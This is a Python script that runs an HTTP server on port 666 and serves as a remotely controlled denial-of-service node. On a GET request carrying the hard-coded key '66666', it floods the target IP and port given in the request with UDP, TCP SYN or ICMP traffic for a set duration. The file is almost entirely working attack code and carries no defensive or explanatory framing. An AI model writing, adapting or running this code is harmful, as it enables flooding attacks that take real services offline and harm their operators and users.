from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from urllib.parse import urlparse, parse_qs
from socket import *
import random
import time
from scapy.layers.inet import IP, TCP, ICMP
import threading

from scapy.sendrecv import send

data = {'result': 'this is a test'}
host = ('0.0.0.0', 666)

def rsync(method, ip, port, duration):
    threads = []
    x = 2
    for i in range(x):
        t = threading.Thread(target=method,args=(ip,port,duration))
        threads.append((t))
        t.start()
        for t in threads:
            t.join()

def udpflood(ip, port, duration):
    # 创建 socket 关键字
    st = socket(AF_INET, SOCK_DGRAM)
    # 创建随机报文数据
    bytes = random._urandom(1024)

    ip = ip
    port = int(port)
    duration = int(duration)
    sent = 0
    print(ip, port, duration)
    time_start = time.time()
    time_end = time_start + duration
    while time.time() < time_end:
        # 发送数据
        st.sendto(bytes, (ip, port))
        sent += 1
        print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    st.close()

def synflood(ip,port,duration):
    ip = IP(dst=ip)
    duration = int(duration)
    time_start = time.time()
    time_end = time_start + duration
    while time.time() < time_end:
        for i in range(20000,65536):
            try:
                tcp = TCP(sport=i, dport=int(port), flags="S", seq=1000)
                from scapy.sendrecv import send
                send(ip / tcp)
            except OSError:
                continue


def icmpflood(ip, port, duration):
    ip = IP(dst=ip)
    icmp_layer = ICMP()
    duration = int(duration)
    time_start = time.time()
    time_end = time_start + duration
    while time.time() < time_end:
        send(ip / icmp_layer)


class Resquest(BaseHTTPRequestHandler):
    def do_GET(self):
        # 解析URL并提取查询参数
        url = urlparse(self.path)
        query_components = parse_qs(url.query)

        # 打印解析出的GET参数
        print("GET请求路径:", self.path)
        print("GET请求参数:", query_components)

        # 这里可以根据查询参数做不同的处理
        response_data = {
            'path': url.path,
            'params': query_components,
            'result': 'GET request processed'
        }

        # 返回响应
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

        self.wfile.write(json.dumps(response_data).encode())
        ip = query_components["ip"][0]  # 从列表中取出第一个元素
        method = query_components["method"][0]
        port = query_components["port"][0]
        time = query_components["time"][0]
        key = query_components["key"][0]
        #print(ip, port, method, time)  # 打印以调试
        #print(ip)
        if key == "66666":

            if method == "udpflood":
                rsync(udpflood,ip, port, time)
            elif method == "synflood":
                rsync(synflood,ip,port,time)
            elif method == "icmpflood":
                rsync(icmpflood,ip,port,time)
            else:
                return 0
        else:
            return 0
    def do_POST(self):
        datas = self.rfile.read(int(self.headers['content-length']))

        print('headers', self.headers)
        print("do post:", self.path, self.client_address, datas)


if __name__ == '__main__':
    server = HTTPServer(host, Resquest)
    print("Starting server, listen at: %s:%s" % host)
    server.serve_forever()



